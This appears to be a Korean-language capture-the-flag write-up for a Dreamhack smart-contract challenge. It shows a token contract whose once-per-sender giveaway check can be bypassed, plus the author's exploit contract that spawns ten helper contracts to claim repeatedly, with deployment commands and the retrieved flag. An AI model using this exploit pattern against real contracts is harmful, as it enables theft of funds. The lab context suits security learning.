```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level {
    mapping(address => uint) public amoTokenBalance;
    mapping(address => bool) alreadyTaken;
    address owner;

    constructor () {
        owner = msg.sender;
        //생성자한테 토큰을 줌 
        amoTokenBalance[owner] = 2**255; // I'm rich
    }

    modifier onlyOnce() {
        require(alreadyTaken[msg.sender] == false, "Already taken!");
        alreadyTaken[msg.sender] = true;
        _;
    }

    function giveaway() public onlyOnce {
        amoTokenBalance[owner] -= 100; // Sad
        amoTokenBalance[tx.origin] += 100;
    }
}
```

```python
accounts:
  - name: owner
    balance: 100ether
  - name: user
    balance: 100ether
```

오너가 따로 있음 

onlyOnce 수정자 회피해서 giveaway를 여러번 받으라는건가 

alreadyTaken[tx.origin]이 아니라서 호출하는 컨트랙트만 다르면 여러번 부를 수 있을 거 같음 

```python
user_balance = contract.functions.amoTokenBalance(user_address).call()
return user_balance >= 1000
```

그렇게 해서 user_balance를 지금 100에서 1000이상으로 늘리면 풀리는 문제일듯 \

```bash
% curl -Ls -w '\nREDIRECT TO: %{url_effective}\n' http://host1.dreamhack.games:21574/start

{"message":"\nPOST /007a6418a0f9/rpc/ : Testnet RPC endpoint. Starts the testnet if it's not running\nGET /007a6418a0f9/info/ : Get information to solve the challenge. Starts the testnet if it's not running\nGET /007a6418a0f9/reset/: Shutdown and reset the testnet\nGET /007a6418a0f9/flag/ : Get flag\n"}
REDIRECT TO: http://host1.dreamhack.games:21574/007a6418a0f9
```

```bash
% curl -Ls http://host1.dreamhack.games:21574/007a6418a0f9/info/

{"message":{"level_contract_address":"0x15060028A334CD857c1Cc885E607D4B1333ade53",
"user_private_key":"0xb40933ef5be3a14137c3b65c2d3aacca4eeed218771497781b088da99e5c71f0",
"user_address":"0xD9269F316a9AF99a9f9278BeFE66F574549269A6"}}
```

```bash
cast send --private-key 0xb40933ef5be3a14137c3b65c2d3aacca4eeed218771497781b088da99e5c71f0 \
  --rpc-url http://host1.dreamhack.games:21574/007a6418a0f9/rpc 0x15060028A334CD857c1Cc885E607D4B1333ade53 \
 "giveaway()"
```

```bash
cast send --private-key 0xb40933ef5be3a14137c3b65c2d3aacca4eeed218771497781b088da99e5c71f0 \
  --rpc-url http://host1.dreamhack.games:21574/007a6418a0f9/rpc 0xD9269F316a9AF99a9f9278BeFE66F574549269A6 \
 "giveaway()"
```

```bash
cast send --private-key 0xb40933ef5be3a14137c3b65c2d3aacca4eeed218771497781b088da99e5c71f0 \
  --rpc-url http://host1.dreamhack.games:21574/007a6418a0f9/rpc 0xD9269F316a9AF99a9f9278BeFE66F574549269A6 \
 "giveaway()"
```

음 머디…

![스크린샷 2025-08-08 오후 6.20.43.png](attachment:d732fd56-dc40-44ac-af19-df790f33be63:스크린샷_2025-08-08_오후_6.20.43.png)

접근 방법은 맞음 

solidity에서 new 키워드를 통해 만들 수 있다고 함 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 인터페이스에서 얘네 두 외부 함수 갖고 오기 
interface LevelInterface {
  function amoTokenBalance(address) external returns (uint);
  function giveaway() external;
}

contract SolveInternal {
	//주소를 받아서 주소를 가진 컨트랙트의 giveaway 호출 
  constructor(address addr) {
    LevelInterface level = LevelInterface(addr);
    level.giveaway();
  }
}

contract Solve {
  constructor (address addr) {
	  // 10번 반복해서 컨트랙트 10개 생성 
    for (uint i = 0; i < 10; i++) {
      new SolveInternal(addr);
    }

		//level로 두 외부 함수 가져오기 
    LevelInterface level = LevelInterface(addr);
    //msg.sender에 amoTokenBalance 실행 
    uint balance = level.amoTokenBalance(msg.sender);
    assert(balance >= 1000);
  }
}
```

```bash
% curl -Ls -w '\nREDIRECT TO: %{url_effective}\n' http://host1.dreamhack.games:18727/start
{"message":"\nPOST /19213159d319/rpc/ : Testnet RPC endpoint. Starts the testnet if it's not running\nGET /19213159d319/info/ : Get information to solve the challenge. Starts the testnet if it's not running\nGET /19213159d319/reset/: Shutdown and reset the testnet\nGET /19213159d319/flag/ : Get flag\n"}
REDIRECT TO: http://host1.dreamhack.games:18727/19213159d319

$ curl http://host1.dreamhack.games:18727/19213159d319/info
{"message":{"level_contract_address":"0xA8c5BAA6ce48A216540AC895aCac6c5520783FA8","user_private_key":"0xfcc080a710a0f49584d024e760ac4e5fe32dc4f12263105cd33b3cfe573b84eb","user_address":"0xeE878b3B0C759953553b93094A9261e57dDc7faB"}}

% forge create --broadcast --rpc-url http://host1.dreamhack.games:18727/19213159d319/rpc \
  --private-key 0xfcc080a710a0f49584d024e760ac4e5fe32dc4f12263105cd33b3cfe573b84eb \
  web3/TokenGiveaway/sol/sol.sol:Solve \
  --constructor-args 0xA8c5BAA6ce48A216540AC895aCac6c5520783FA8
[⠊] Compiling...
No files changed, compilation skipped
Deployer: 0xeE878b3B0C759953553b93094A9261e57dDc7faB
Deployed to: 0xc89FccFBb161C7260F8C2835f856d678B8822Fdc
Transaction hash: 0x582dbd7ef69e34a5b1408f000bb4f39a2a773f899fe307275a52a3d16247e0fb

% curl http://host1.dreamhack.games:18727/19213159d319/flag                               
{"message":"DH{e7e87989be6fbb5fb53157452c0dec79161de9915c992587725ddc94642bb8af}"}
```